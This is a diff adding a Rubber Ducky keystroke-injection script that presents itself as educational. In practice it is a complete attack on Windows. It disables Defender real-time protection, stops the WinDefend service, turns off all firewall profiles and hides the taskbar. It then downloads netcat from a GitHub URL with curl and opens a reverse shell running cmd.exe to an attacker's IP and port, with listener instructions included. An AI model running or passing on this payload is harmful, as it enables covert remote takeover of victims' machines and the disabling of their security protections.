@@ -1,0 +1,220 @@
+REM CREATOR : Danial Javanrad 
+REM Catergory : NETCAT REVERSE SHELL TO Windows CMD
+REM How to use : https://github.com/djpoker/RubberDucky-Reverse-Shell-Script-Working100---2024
+REM GITHUB : https://github.com/djpoker
+REM DEVICE : RUBBER DUCKY
+
+REM "EDUCATIONAL PURPOSE ONLY"
+
+REM This code will execute a NetCat reverse shell on Target Device
+REM ---------------------------------------------------------------------------------------------
+REM (REQUIRED) You can Listen to the attacking port using Netcat in You machine:
+REM ATTACKER MACHINE COMMANDs:           nc -lvp <YOUR PORT>
+REM ---------------------------------------------------------------------------------------------
+REM (REQUIRED) Change the whole <YOUR IP> <YOUR PORT> With your attacker information in *Line 212*
+REM EXAMPLE: STRING 192.168.1.2 4444 -e cmd.exe
+REM ---------------------------------------------------------------------------------------------
+REM (OPTIONAL) You can also change the link for downloading the NetCat (OPTIONAL it already works with my link in it) *Line 169*
+REM NOTICE: if you changed the download directory make sure that that nc64.exe can be downloaded directly from a link
+REM Example: https://github.com/djpoker/NETCAT-Live/raw/main/nc64.exe 
+
+REM OFFICIAL NETCAT ZIP DOWNLOAD: https://eternallybored.org/misc/netcat/
+REM ---------------------------------------------------------------------------------------------
+REM (OPTIONAL) You can also change File Directory in *LINE 158 - 170 - 202* With your own
+
+REM ---------------------------------------------------------------------------------------------
+REM *First Turning off windows Real-Time Protection* 
+REM ---------------------------------------------------------------------------------------------
+DELAY 200
+
+GUI d
+
+DELAY 500
+
+REM Open Windows Defender settings
+
+CTRL ESC
+
+DELAY 1000
+
+STRING Windows Defender Settings
+
+DELAY 100
+
+ENTER
+
+REM Navigate to realtime protection and disable it
+
+DELAY 6000
+
+ENTER
+
+DELAY 500
+
+TAB
+
+DELAY 250
+
+TAB
+
+DELAY 250
+
+TAB
+
+DELAY 250
+
+TAB
+
+ENTER
+
+DELAY 300
+
+SPACE
+
+DELAY 300
+
+LEFT
+
+DELAY 300
+
+ENTER
+
+REM Close Settings
+
+DELAY 300
+
+ALT F4
+
+DELAY 300
+
+ALT F4
+
+DELAY 500
+
+REM ---------------------------------------------------------------------------------------------
+REM *Starts CMD with ADMIN*
+REM ---------------------------------------------------------------------------------------------
+
+GUI d
+
+DELAY 200
+
+GUI r
+
+DELAY 100
+
+STRING cmd
+
+CTRL SHIFT ENTER
+
+DELAY 300
+
+LEFT
+
+DELAY 100
+
+ENTER
+
+DELAY 200
+
+REM ---------------------------------------------------------------------------------------------
+REM *Hiding Taskbar*
+REM ---------------------------------------------------------------------------------------------
+
+STRING powershell -command "&{$p='HKCU:SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StuckRects3';$v=(Get-ItemProperty -Path $p).Settings;$v[8]=3;&Set-ItemProperty -Path $p -Name Settings -Value $v;&Stop-Process -f -ProcessName explorer}"
+
+ENTER
+
+DELAY 100
+
+REM ---------------------------------------------------------------------------------------------
+REM *Stop all Windows Virus protection *
+REM (OPTIONAL)
+REM *IF it Works for you You can Delete the Commands for Real-Time Protection At first*
+REM *I recommend not deleting it*
+REM ---------------------------------------------------------------------------------------------
+
+STRING powershell sc stop WinDefend
+
+ENTER
+
+DELAY 100
+
+REM ---------------------------------------------------------------------------------------------
+REM *Stop all Windows FIrewalls*
+REM ---------------------------------------------------------------------------------------------
+
+STRING netsh advfirewall set allprofiles state off
+
+ENTER
+
+DELAY 100
+
+REM ---------------------------------------------------------------------------------------------
+REM *Create Folder For Netcat in C:/USERS/ * (You can change the directory)
+REM ---------------------------------------------------------------------------------------------
+
+
+STRING mkdir c:\USERS\nc
+
+ENTER
+
+DELAY 200
+
+REM ---------------------------------------------------------------------------------------------
+REM *Download NetCat app From URL save as nc64.exe it in the file directory that we created in line 158*
+REM Notice: If you have changed the directory . Change the saving directory after -O <Your directory> with yours
+REM ---------------------------------------------------------------------------------------------
+
+STRING curl -L -k -o "c:\USERS\nc\nc64.exe" "https://github.com/djpoker/NETCAT-Live/raw/main/nc64.exe"
+
+DELAY 500
+
+ENTER
+
+DELAY 5000
+
+REM ---------------------------------------------------------------------------------------------
+REM *EXIT CMD*
+REM ---------------------------------------------------------------------------------------------
+
+STRING exit
+
+ENTER
+
+DELAY 500
+
+REM ---------------------------------------------------------------------------------------------
+REM *Starts NetCat client from directory*
+REM Notice : If you have changed the directory in Line 158 change here too!
+REM Directory Format for here : <YOUR DIRECTORT>\nc64.exe
+REM ---------------------------------------------------------------------------------------------
+
+GUI d
+
+DELAY 200
+
+GUI r
+
+DELAY 100
+
+STRING C:\USERS\nc\nc64.exe
+
+REM ---------------------------------------------------------------------------------------------
+REM *CREATING A REVERSE SHELL WITH YOUR LISTENING SERVER*
+REM *CHANGE <YOUR IP> <YOUR PORT> with attacker ip and port*
+REM ---------------------------------------------------------------------------------------------
+
+ENTER
+
+DELAY 700
+
+STRING <YOUR IP> <YOUR PORT> -e cmd.exe
+
+ENTER
+
+REM ---------------------------------------------------------------------------------------------
+REM *Minimize Netcat*
+REM ---------------------------------------------------------------------------------------------
+
+GUI DOWN
